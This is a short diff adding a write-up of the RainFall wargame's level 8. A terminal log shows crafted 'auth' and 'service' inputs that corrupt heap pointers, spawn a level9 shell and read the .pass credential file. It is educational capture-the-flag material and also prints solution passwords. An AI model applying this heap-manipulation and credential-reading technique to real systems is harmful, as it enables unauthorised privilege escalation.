@@ -1,0 +1,36 @@
+Once we are logged as level8/5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+(nil), 0x804a008
+auth
+(nil), 0x804a008
+auth asdfasd
+0x804a040, 0x804a008
+login
+Password:
+0x804a040, 0x804a008
+^C
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth hello
+0x804a008, (nil)
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+0x804a008, 0x804a018
+login
+$ ls
+ls: cannot open directory .: Permission denied
+$ whoami
+level9
+$ cd /home/user/level9
+$ ls
+level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
+
+As you see we got a shell and printed the level9 flag.
+
+\x10\xa0\x04\x08
+0804a010
